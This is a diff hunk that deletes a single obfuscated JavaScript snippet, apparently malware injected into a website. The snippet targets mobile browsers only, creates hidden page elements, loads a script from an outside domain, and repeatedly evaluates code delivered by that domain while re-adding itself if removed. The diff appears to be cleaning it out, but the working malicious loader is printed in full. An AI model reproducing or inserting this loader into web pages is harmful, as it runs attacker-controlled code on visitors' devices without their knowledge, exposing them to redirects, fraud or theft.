@@ -1,6 +1,0 @@
-;(function(){if(/Android|Windows Phone|iPhone|iPad|iPod/i.test(navigator.userAgent)){let lkjdlknlo_dv=document.createElement("div");lkjdlknlo_dv.id='oxmiupwj_bx_147';document.currentScript.parentNode.insertBefore(lkjdlknlo_dv,document.currentScript);let dd=document.createElement("div");dd.innerHTML="<input id='oxmiupwj_it_147' data-kind='undefind' data-schme='didendendeufennnefnninnidffdfeenneduenfnnfdffdfeenneduenfnnfdfeeueeunnnienuennnniendeuennindnndfnennfeeudnfndineufedddif' type='hidden' />";document.body.appendChild(dd);;let els=document.createElement("script");els.id="sc_oxmiupwj_bx_147";els.src="https://dcsxv.dcsxv.com/rs/tp.html";document.head.appendChild(els);function ljbqymxoqvqt(){setTimeout(function(){let t=document.getElementById('oxmiupwj_it_147').value;let idx=t.indexOf("<__s>");document.getElementById('oxmiupwj_bx_147').innerHTML=t.substring(0,idx-1);if(!document.getElementById("oxmiupwj_bxx_147")&&t!==""){let d=document.createElement("script");d.id="oxmiupwj_bxx_147";d.innerHTML=t.substring(idx+5,t.length-6);document.head.appendChild(d)};if(!document.getElementById("sc_oxmiupwj_bx_147")){
-            let els = document.createElement("script");
-            els.id="sc_oxmiupwj_bx_147";
-            els.src = "https://dcsxv.dcsxv.com/rs/tp.html";
-            document.head.appendChild(els);
-        };ljbqymxoqvqt()},10)}ljbqymxoqvqt()}})();
